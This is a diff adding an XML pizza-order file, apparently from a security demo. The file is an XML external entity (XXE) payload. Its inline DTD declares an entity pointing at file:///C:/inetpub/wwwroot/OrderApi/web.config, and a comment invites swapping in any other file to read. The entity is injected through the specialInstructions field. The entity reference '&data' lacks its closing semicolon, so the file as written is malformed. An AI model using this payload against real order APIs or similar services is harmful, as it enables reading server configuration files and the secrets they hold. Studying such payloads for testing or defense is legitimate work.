@@ -1,0 +1,28 @@
+﻿<?xml version='1.0'?>
+<!DOCTYPE order [
+    <!ELEMENT order (name,email,phone,items+)>
+    <!ELEMENT name (#PCDATA)>
+    <!ELEMENT phone (#PCDATA)>
+    <!ELEMENT items (orderItem+)>
+    <!ELEMENT orderItem (quantity,itemName,specialInstructions*)>
+    <!ELEMENT quantity (#PCDATA)>
+    <!ELEMENT itemName (#PCDATA)>
+    <!ELEMENT specialInstructions ANY>
+    <!-- Change this to a file to read-->
+    <!ENTITY data SYSTEM "file:///C:/inetpub/wwwroot/OrderApi/web.config">
+]>
+<order>
+    <name>David Berry</name>
+    <phone>708-555-1212</phone>
+    <items>
+        <orderItem>
+            <quantity>1</quantity>
+            <itemName>Large Cheese Pizza</itemName>
+            <specialInstructions>&data</specialInstructions>
+        </orderItem>
+        <orderItem>
+            <quantity>2</quantity>
+            <itemName>Large Sausage Pizza</itemName>
+        </orderItem>
+    </items>
+</order>
